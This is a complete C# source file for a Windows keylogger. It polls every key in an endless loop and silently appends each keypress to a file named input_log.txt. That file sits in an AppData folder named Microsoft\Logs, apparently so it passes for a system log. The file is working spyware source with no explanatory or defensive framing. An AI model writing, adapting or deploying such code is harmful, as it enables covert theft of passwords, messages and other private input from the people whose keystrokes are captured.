using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

class Keylogger
{
    [DllImport("User32.dll")]
    private static extern short GetAsyncKeyState(Keys vKey);

    static void Main()
    {
        string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Logs");
        Directory.CreateDirectory(logPath);
        string filePath = Path.Combine(logPath, "input_log.txt");

        using (StreamWriter sw = new StreamWriter(filePath, true))
        {
            while (true)
            {
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(key) == -32767)
                    {
                        sw.Write($"[{key}]");
                        sw.Flush();
                    }
                }
                System.Threading.Thread.Sleep(10);
            }
        }
    }
}
